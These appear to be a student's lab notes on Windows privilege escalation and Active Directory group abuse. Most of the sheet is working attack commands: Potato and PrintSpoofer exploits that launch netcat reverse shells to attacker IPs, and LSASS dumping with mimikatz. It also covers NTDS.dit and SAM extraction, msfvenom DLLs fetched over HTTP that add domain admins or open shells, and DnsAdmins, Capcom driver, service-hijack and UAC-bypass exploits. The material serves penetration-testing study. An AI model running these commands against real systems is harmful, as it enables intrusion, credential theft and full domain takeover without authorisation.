


 # Enumerating the enviroment


## Network Information

We should always look at routing tables to view information about the local network , also gather information about the local domain and examine the ARP cache for each interface and view other hosts the host has recently communicated with

```C:\> ipconfig /all```

` C:\> arp -a`

`C:\> route print  `(  Routing Table  )

Many organizations utilize some sort of application whitelisting solution to control what types of applications and files certain users can run. This may be used to attempt to block non-admin users from running cmd.exe or powershell.exe or other binaries and file types not needed for their day-to-day work. A popular solution offered by Microsoft is AppLocker. We can use the `GetAppLockerPolicy` cmdlet to enumerate the local, effective (enforced), and domain AppLocker policies. 


## Check Windows Defender Status

`PS C:\> Get-MpComputerStatus`


## List AppLocker Rules

`PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`


## Test AppLocker Policy

`PS C:\> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`

    
## System Information


look at running processes 

```C:\> tasklist /svc```


## Display All Environment Variables


it is not uncommon to find administrators (or applications) modify the PATH. 
If the folder placed in the PATH is writable by your user, it may be possible to perform DLL Injections against other applications. Remember, when running a program, Windows looks for that program in the CWD (Current Working Directory) first, then from the PATH going left to right. This means if the custom path is placed on the left (before C:\Windows\System32), it is much more dangerous than on the right.

In addition to the PATH, set can also give up other helpful information such as the HOME DRIVE. In enterprises, this will often be a file share.   
Shares are utilized for home directories so the user can log on to other computers and have the same experience/files/desktop/etc. (Roaming Profiles). This may also mean the user takes malicious items with them. If a file is placed in USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup, when the user logs into a different machine, this file will execute.

``` C:\ > set``` 

## View Detailed Configuration Information

The systeminfo command will show if the box has been patched recently and if it is a VM.The System Boot Time and OS Version can also be checked to get an idea of the patch level. If the box has not been restarted in over six months, chances are it is also not being patched.

`C:\> systeminfo`



    If systeminfo doesn't display hotfixes, they may be queriable with WMI using the WMI-Command binary with QFE (Quick Fix Engineering) to display patches.

```C:\> wmic qfe```

    or

```PS C:\> Get-HotFix | ft -AutoSize```


## Installed Programs

- Is FileZilla/Putty or apps like these installed?
- Run LaZagne to check if stored credentials for those applications are installed. 
- some programs may be installed and running as a service that is vulnerable.

`C:\> wmic product get name`

    or

`PS C:\> Get-WmiObject -Class Win32_Product |  select Name, Version`


## Display Running Processes

The netstat command will display active TCP and UDP connections

`PS C:\> netstat -ano`

    
## User/group information

- Logged-In Users

`C:\> query user`

- Get All Users

`C:\> net user`



- Current User

`C:\> echo %USERNAME%`

- Current User Privileges

`C:\> whoami /priv`

- Current User Group Information

`C:\> whoami /groups`

- Get All Groups

`C:\> net localgroup`

- Details About a Group

`C:\> net localgroup {groupname}`


- Get Password Policy & Other Account Information

`C:\> net accounts`


# Processes



## Access Tokens

In Windows, access tokens are used to describe the security context (security attributes or rules) of a process or thread. The token includes information about the user account's identity and privileges related to a specific process or thread. When a user authenticates to a system, their password is verified against a security database, and if properly authenticated, they will be assigned an access token. Every time a user interacts with a process, a copy of this token will be presented to determine their privilege level.


## Enumerating Network Services

`C:\> netstat -ano`


## Named Pipes


Pipes are essentially files stored in memory that get cleared out after being read.
 
Pipes are used for communication between two applications or processes using shared memory. There are two types of pipes, `named pipes` and `anonymous pipes`. An example of a named pipe is \\.\PipeName\\ExampleNamedPipeServer. Windows systems use a client-server implementation for pipe communication. In this type of implementation, the process that creates a named pipe is the server, and the process communicating with the named pipe is the client. Named pipes can communicate using `half-duplex`, or a `one-way channel `with the client only being able to write data to the server, or `duplex`, which is a two-way communication channel that allows the client to write data over the pipe, and the server to respond back with data over that pipe. Every active connection to a named pipe server results in the creation of a new named pipe. These all share the same pipe name but communicate using a different data buffer.

We can use the tool PipeList from the `Sysinternals` Suite to enumerate instances of named pipes.

    `C:\> pipelist.exe /accepteula`


Additionally, we can use PowerShell to list named pipes using gci (Get-ChildItem).

`PS C:\>  gci \\.\pipe\`

After obtaining a listing of named pipes, we can use `Accesschk` to enumerate the permissions assigned to a specific named pipe by reviewing the Discretionary Access List (DACL)

`C:\> accesschk.exe /accepteula \\.\Pipe\lsass -v`


Using accesschk we can search for all named pipes that allow write access.

`C:\> accesschk.exe -accepteula -w \pipe\WindscribeService -v`







# Windows Privileges

    
User and group privileges are stored in a database and granted via an access token when a user logs on to a system.
Each time a user attempts to perform a privileged action, the system reviews the user's access token to see if the account has the required privileges, and if so, checks to see if they are enabled!

## Windows Authorization Process

Every single security principal is identified by a unique Security Identifier (SID).
This process started when a user attempts to access a securable object such as a folder on a file share. During this process, the user's access token (including their user SID, SIDs for any groups they are members of, privilege list, and other access information) is compared against Access Control Entries (ACEs) within the object's security descriptor (which contains security information about a securable object such as access rights (discussed below) granted to users or groups). Once this comparison is complete, a decision is made to either grant or deny access. 


#Rights and Privileges in Windows

    The following groups can be abused in an active directory enviroment to escalate privileges

   
   
|Group 	|Description|
|----------|--------|
Default Administrators 	 |Domain Admins and Enterprise Admins are "super" groups.
Server Operators 	|Members can modify services, access SMB shares, and backup files.
Backup Operators 	 |Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.
Print Operators 	|Members can log on to DCs locally and "trick" Windows into loading a malicious driver.
Hyper-V Administrators 	|If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.
Account Operators 	|Members can modify non-protected accounts and groups in the domain.
Remote Desktop Users 	|Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.
Remote Management Users 	|Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).
Group Policy Creator Owners 	|Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.
Schema Admins 	|Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.
DNS Admins 	|Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.





## User Rights Assignment

Depending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account.

Typing the command whoami /priv will give you a listing of all user rights assigned to your current user. Some rights are only available to administrative users and can only be listed/leveraged when running an elevated cmd or PowerShell session.

[Enable-Privilege.ps1](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1)  
[another script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/ ) 

    !!!!A securable object is an object that can have a security descriptor. All named Windows objects are securable. Some unnamed objects, such as process and thread objects, can have security descriptors too. 
```
    Each type of securable object defines its own set of specific access rights and its own mapping of generic access rights. 
```
    
```
    !!Each process on the system holds a token object reference within its
    EPROCESS structure which is used during object access negotiations or
    privileged system tasks.  This token is granted via LSASS during the logon
    process, and thus all processes within a session run under the same token,
    initially.
```

```
    !!!A process holds a primary token and threads executing within the process
    inherit this same token.  When a thread needs to access an object using a
    different set of credentials, it can use an impersonation token.  Using an
    impersonation token does not impact the primary token or other threads, but
    only execution in the context of the impersonating thread.  These
    impersonation tokens can be obtained via a number of different APIs
    provided by the kernel.
```
```
!!The token serves as  processes access ticket, which must be presented to
the various gatekeepers within Windows; it's evaluated via SeAccessCheck on
object access and by SeSinglePrivilegeCheck during privileged operations.
When a process requests write access to a file, for example, SeAccessCheck
will evaluate the tokens integrity level followed by an evaluation of its
Discretionary Access Control List (DACL).  When a process attempts to
shutdown a system via NtShutdownSystem, the kernel will evaluate whether or
not the requesting process token has SeShutdownPrivilege enabled.
```




## SeImpersonate and SeAssignPrimaryToken

    

Acccess tokens are not considered secure resources, as they are just locations within memory that could be brute-forced by users that cannot read memory. To utilize the token, the SeImpersonate privilege is needed. 

Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space. Attackers often abuse this privilege in the "Potato style" privescs - where a service account can SeImpersonate, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.



### JuicyPotato

        !JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.



- Connecting with MSSQLClient.py

`$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth`

- Enabling xp_cmdshell

`SQL> enable_xp_cmdshell`

    Note: We don't actually have to type RECONFIGURE as Impacket does this for us.

- Confirming Access

`SQL> xp_cmdshell whoami /priv`


download the JuicyPotato.exe binary and upload this and nc.exe to the target server. 
- -l is the COM server listening port
-  -p is the program to launch (cmd.exe)
- -a is the argument passed to cmd.exe, and 
- -t is the createprocess call(depends on privilege)

`SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`



### PrintSpoofer and RoguePotato


#### PrintSpoofer
We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with mssqlclient.py and use the tool with the -c argument to execute a command. Here, using nc.exe to spawn a reverse shell 

`SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.91 4040 -e cmd"`


#### metasploit PrintSpoofer

    use exploit/windows/local/ms16_075_reflection_juicy





## SeDebugPrivilege

    

### ProcDump

We can use ProcDump from the SysInternals suite to leverage this privilege and dump process memory. 

`C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp`

This is successful, and we can load this in Mimikatz using the sekurlsa::minidump commandand execute sekurlsa::logonPasswords commands

    Note: It is always a good idea to type "log" before running any commands in "Mimikatz"
```
    C:\> mimikatz.exe

    mimikatz # log

    mimikatz # sekurlsa::minidump lsass.dmp

    mimikatz # sekurlsa::logonpasswords
```
    !we can take a manual memory dump of the LSASS process via the Task Manager by browsing to the Details tab, choosing the LSASS process, and selecting Create dump file.



### Remote Code Execution as SYSTEM



First, transfer this [PoC script ](   https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1 )  over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"") `
        
        Note that we must add a third blank argument "" at the end for the PoC to work properly.

[another](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) poc script



## SeTakeOwnershipPrivilege

        
SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor.


#### Setting this right
The setting can be set in Group Policy under:

    Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment

    
    
#### Enabling SeTakeOwnershipPrivilege


We can enable it using this script 
[EnableAllTokenPrivs.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)  

```
    PS C:\> Import-Module .\Enable-Privilege.ps1
    PS C:\> .\EnableAllTokenPrivs.ps1
```

#### Choosing a Target File


```
    c:\inetpub\wwwwroot\web.config
    %WINDIR%\repair\sam
    %WINDIR%\repair\system
    %WINDIR%\repair\software  , %WINDIR%\repair\security
    %WINDIR%\system32\config\SecEvent.Evt
    %WINDIR%\system32\config\default.sav
    %WINDIR%\system32\config\security.sav
    %WINDIR%\system32\config\software.sav
    %WINDIR%\system32\config\system.sav
```


#### Gather Info
```    PS C:\> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}```

#### Checking File Ownership

If the owner is not shown, means that we likely do not have enough permissions over the object.

`PS C:\> cmd /c dir /q 'C:\Department Shares\Private\IT'`

We can see that the IT share appears to be owned by a service account and does contain a file cred.txt with some data inside it.

#### Taking Ownership 

`PS C:\> takeown /f 'C:\Department Shares\Private\IT\cred.txt'`

#### Confirming Ownership Changed

```PS C:\> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}```

#### Modifying the File ACL

    We may still not be able to read the file and need to modify the file ACL using icacls to be able to read it.

`PS C:\> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F`







# Windows Group Privileges

        

## Windows Builtin Groups

        
    
Some of the builtin groups in active directory enviroment are the above

-    Backup Operators 	
-    Event Log Readers 	
-    DnsAdmins
-    Hyper-V Administrators 	
-    Print Operators 	
-    Server Operators


`PS C:\> whoami /groups`

### Backup Operators 

Membership of this group grants its members the SeBackup and SeRestore privileges. The SeBackupPrivilege allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag.


    [POC](https://github.com/giuliano108/SeBackupPrivilege)

#### Importing the module
```
    PS C:\> Import-Module .\SeBackupPrivilegeUtils.dll
    PS C:\> Import-Module .\SeBackupPrivilegeCmdLets.dll
```
#### Verifying SeBackupPrivilege is Enabled
```
    PS C:\> whoami /priv

    SeBackupPrivilege             Back up files and directories  Disabled
    ...

    PS C:\> Get-SeBackupPrivilege

 ```   
#### Copying a Protected File
```
PS C:\> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' c:\path\to\new\file
```


#### Attacking a Domain Controller - Copying NTDS.dit


- This group also permits logging in locally to a domain controller. 

- The  NTDS.dit contains the NTLM hashes for all user and computer objects in the domain. 
- However, this file is locked 

- we can use the Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive

[shadowcopies according to microsoft](  https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow  )

```
    PS C:\> diskshadow.exe

    DISKSHADOW> set verbose on
    DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
    DISKSHADOW> set context clientaccessible //Specifies that the shadow copy is usable by client versions of Windows. This context is persistent by default.
    DISKSHADOW> set context persistent    // 	Specifies that the shadow copy persists across program exit, reset, or restart.
    DISKSHADOW> begin backup
    DISKSHADOW> add volume C: alias cdrive
    DISKSHADOW> create
    DISKSHADOW> expose %cdrive% E:
    DISKSHADOW> end backup
    DISKSHADOW> exit
```

#### Copying NTDS.dit Locally
```
    PS C:\> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
    
    
#### Backing up SAM and SYSTEM Registry Hives


```
C:\> reg save HKLM\SYSTEM SYSTEM.SAV

C:\> reg save HKLM\SAM SAM.SAV
```
    !It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it
#### Extracting Credentials from NTDS.dit

```
PS C:\> Import-Module .\DSInternals.psd1

PS C:\> $key = Get-BootKey -SystemHivePath .\SYSTEM

PS C:\> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```


#### Extracting Hashes Using SecretsDump
```
    $ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```


#### Robocopy

The built-in utility robocopy can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. 

`C:\> robocopy /B E:\Windows\NTDS .\ntds ntds.dit`






### Event Log Readers

    
Administrators or members of the Event Log Readers group have permission to access logs.

#### Confirming Group Membership

`C:\> net localgroup "Event Log Readers"`

#### Searching Security Logs Using wevtutil

We can query Windows events from the command line using 
- the wevtutil utility
- the Get-WinEvent PowerShell cmdlet.

Many Windows commands support `passing a password as a parameter`, and if auditing of process command lines is enabled, this sensitive information will be captured.

```PS C:\> wevtutil qe Security /rd:true /f:text | Select-String "/user"```

    
    
#### Passing Credentials to wevtutil

We can also specify alternate credentials for wevtutil using the parameters /u and /p.

```C:\> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"```

    
#### Searching Security Logs Using Get-WinEvent in PS

    
    
Note: Searching the Security event log with Get-WInEvent requires administrator access or permissions adjusted on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. Membership in just the Event Log Readers group is not sufficient.

```
PS C:\> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```



### DnsAdmins

    
The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as NT AUTHORITY\SYSTEM

It is possible to use the built-in dnscmd utility to specify the path of the plugin DLL. [adsecurity](   https://adsecurity.org/?p=4064  )

The following attack can be performed when DNS is run on a Domain Controller :



-    DNS management is performed over RPC
    
-    ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. 
-    This can be done with the dnscmd tool from the command line
    
-    When a member of the DnsAdmins group runs the dnscmd command below, the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll registry key is populated
    
-    When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
    
-    An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.


#### Generating Malicious DLL

`$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`


`$ python3 -m http.server 7777`

`PS C:\>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"`




#### Loading DLL

     Only members of the DnsAdmins group are permitted to do this.

`C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll`




    !!Note: We must specify the full path to our custom DLL or the attack will not work properly.



#### Try to restart the service

`C:\> wmic useraccount where name="netadm" get sid`

     -Checking Permissions on DNS Service

     Once we have the user's SID, we can use the sc command to check permissions on the service. 
```
     C:\> sc.exe sdshow DNS

     D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```
    (  SDDL syntax in Windows)

#### Stopping the DNS Service

`C:\> sc stop dns`

#### Starting the DNS Service

`C:\> sc start dns`

#### Confirming exploitation

`C:\> net group "Domain Admins" /dom`

    


#### Cleaning up

`C:\> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll`

`C:\> sc.exe start dns`

`C:\> sc query dns`




#### Creating a WPAD Record

Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to disable global query block security, which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

#### Disabling the Global Query Block List

`C:\> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`

#### Adding a WPAD Record

`C:\> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address {attackers_machine}`





                
### Print Operators


Print Operators is another highly privileged group, which grants its members the SeLoadDriverPrivilege, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. 

members of this group can load and unload device drivers on all domain controllers in the domain

Use Gui to spawn a administrator shell or bypass [UAC](https://github.com/hfiref0x/UACME) 

`C:\> whoami /priv`


the driver Capcom.sys contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.



Download it locally and edit it, pasting over the includes below.

Next, from a Visual Studio 2019 Developer Command Prompt, compile it using cl.exe.


#### Compile with cl.exe

`C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`

#### Add Reference to Driver

Next, download the Capcom.sys driver from [here]( https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys  ), and save it to C:\temp. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.

```
C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```


 ```C:\> EnableSeLoadDriverPrivilege.exe```


#### Use ExploitCapcom Tool to Escalate Privileges

[ExploitCapcom](https://github.com/tandasat/ExploitCapcom)

`PS C:\> .\ExploitCapcom.exe`

#### Alternate Exploitation - No GUI

If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace C:\\Windows\\system32\\cmd.exe" with, say, a reverse shell binary 
        
#### Automating the Steps

We can use a tool such as [EoPLoadDriver](  https://github.com/TarlogicSecurity/EoPLoadDriver/ ) to automate the process
        
```
C:\> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
We would then run ExploitCapcom.exe to pop a SYSTEM shell or run our custom binary.

#### Clean-up
```
        C:\> reg delete HKCU\System\CurrentControlSet\Capcom
```
 

        


### Server Operators

        
The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to `control local services`.

#### Querying the AppReadiness Service

        C:\> sc qc AppReadiness

#### Checking Service Permissions with PsService

We can use the service viewer/controller PsService, which is part of the Sysinternals suite

`C:\> c:\Tools\PsService.exe security AppReadiness`
        


#### Modifying the Service Binary Path

`C:\> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"`

#### Starting the Service

`C:\> sc start AppReadiness`

#### Retrieving NTLM Password Hashes from the Domain Controller

`$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator`





# OS specific attacks

        


                --User Account Control


        User Account Control (UAC) is a feature that enables a consent prompt for elevated activities. Applications have different integrity levels, and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.


        When UAC is in place, a user can log into their system with their standard user account. When processes are launched using a standard user token, they can perform tasks using the rights granted to a standard user. Some applications require additional permissions to run, and UAC can provide additional access rights to the token for them to run correctly.



            
User Account Control: Admin Approval Mode for the built-in Administrator account 	FilterAdministratorToken 	Disabled

User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop 	EnableUIADesktopToggle 	Disabled

User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode 	ConsentPromptBehaviorAdmin 	Prompt for consent for non-Windows binaries

User Account Control: Behavior of the elevation prompt for standard users 	ConsentPromptBehaviorUser 	Prompt for credentials on the secure desktop

User Account Control: Detect application installations and prompt for elevation 	EnableInstallerDetection 	Enabled (default for home) Disabled (default for enterprise)

User Account Control: Only elevate executables that are signed and validated 	ValidateAdminCodeSignatures 	Disabled


User Account Control: Only elevate UIAccess applications that are installed in secure locations 	EnableSecureUIAPaths 	Enabled

User Account Control: Run all administrators in Admin Approval Mode 	
EnableLUA 	Enabled

User Account Control: Switch to the secure desktop when prompting for elevation 	PromptOnSecureDesktop 	Enabled

User Account Control: Virtualize file and registry write failures to per-user locations 	
EnableVirtualization 	                        Enabled        


        The default RID 500 administrator account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in. In the example below, the user account sarah is in the administrators group, but cmd.exe is currently running in the context of their unprivileged access token.


        C:\> whoami /user

        User Name         SID
        ================= ==============================================
        winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002


        C:\> net localgroup administrators

        Members

        -------------------------------------------------------------------------------
        Administrator
        mrb3n
        sarah
        The command completed successfully.



        C:\> whoami /priv

        PRIVILEGES INFORMATION
        ----------------------

        Privilege Name                Description                          State
        ============================= ==================================== ========
        SeShutdownPrivilege           Shut down the system                 Disabled
        SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
        SeUndockPrivilege             Remove computer from docking station Disabled
        SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
        SeTimeZonePrivilege           Change the time zone                 Disabled



        -Confirming UAC is Enabled

        There is no command-line version of the GUI consent prompt, so we will have to bypass UAC to execute commands with our privileged access token. First, let's confirm if UAC is enabled and, if so, at what level.

        C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

        HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
        EnableLUA    REG_DWORD    0x1


        -Checking UAC Level

        C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

        HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
        ConsentPromptBehaviorAdmin    REG_DWORD    0x5


        The value of ConsentPromptBehaviorAdmin is 0x5, which means the highest UAC level of Always notify is enabled. There are fewer UAC bypasses at this highest level.



        -Checking Windows Version

        (  https://en.wikipedia.org/wiki/Windows_10_version_history  )

        PS C:\> [environment]::OSVersion.Version

        Major  Minor  Build  Revision
        -----  -----  -----  --------
        10     0      14393  0



                (   https://github.com/hfiref0x/UACME   )
        The UACME project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. Let's use technique number 54, which is stated to work from Windows 10 build 14393. This technique targets the 32-bit version of the auto-elevating binary SystemPropertiesAdvanced.exe. There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt.


        (   https://egre55.github.io/system-properties-uac-bypass  )
        According to this blog post, the 32-bit version of SystemPropertiesAdvanced.exe attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.


        !When attempting to locate a DLL, Windows will use the following search order.

        The directory from which the application loaded.
        The system directory C:\Windows\System32 for 64-bit systems.
        The 16-bit system directory C:\Windows\System (not supported on 64-bit systems)
        The Windows directory.
        Any directories that are listed in the PATH environment variable.


        -Reviewing Path Variable

        PS C:\> cmd /c echo %PATH%

        -Generating Malicious srrstr.dll DLL

        $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

        -Downloading DLL Target

        PS C:\>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

        -Testing Connection

        f we execute the malicious srrstr.dll file, we will receive a shell back showing normal user rights (UAC enabled)

        -Executing SystemPropertiesAdvanced.exe on Target Host

        C:\> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe






                --Weak Permissions


        -Permissive File System ACLs

        -SharpUp

        We can use SharpUp from the GhostPack suite of tools to check for service binaries suffering from weak ACLs

        (  https://github.com/GhostPack/SharpUp/  )

        PS C:\> .\SharpUp.exe audit

        -Checking Permissions with icacls

        Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

        (   https://ss64.com/nt/icacls.html  )

        PS C:\> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

        -Replacing Service Binary

        This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with msfvenom. It can give us a reverse shell as SYSTEM, or add a local admin user and give us full administrative control over the machine.

        This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with msfvenom. It can give us a reverse shell as SYSTEM, or add a local admin user and give us full administrative control over the machine.

        C:\> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
        C:\> sc start SecurityService

        -Weak Service Permissions

        Let's check the SharpUp output again for any modifiable services. We see the WindscribeService is potentially misconfigured.

        === Modifiable Services ===
 
        Name             : WindscribeService
        DisplayName      : WindscribeService
        Description      : Manages the firewall and controls the VPN tunnel
        State            : Running
        StartMode        : Auto
        PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"


        -Checking Permissions with AccessChk

        Next, we'll use AccessChk from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are -q (omit banner), -u (suppress errors), -v (verbose), -c (specify name of a Windows service), and -w (show only objects that have write access). Here we can see that all Authenticated Users have SERVICE_ALL_ACCESS rights over the service, which means full read/write control over it.


        C:\> accesschk.exe /accepteula -quvcw WindscribeService
 
        Accesschk v6.13 - Reports effective permissions for securable objects
        Copyright ⌐ 2006-2020 Mark Russinovich
        Sysinternals - www.sysinternals.com
        
        WindscribeService
        Medium Mandatory Level (Default) [No-Write-Up]
        RW NT AUTHORITY\SYSTEM
                SERVICE_ALL_ACCESS
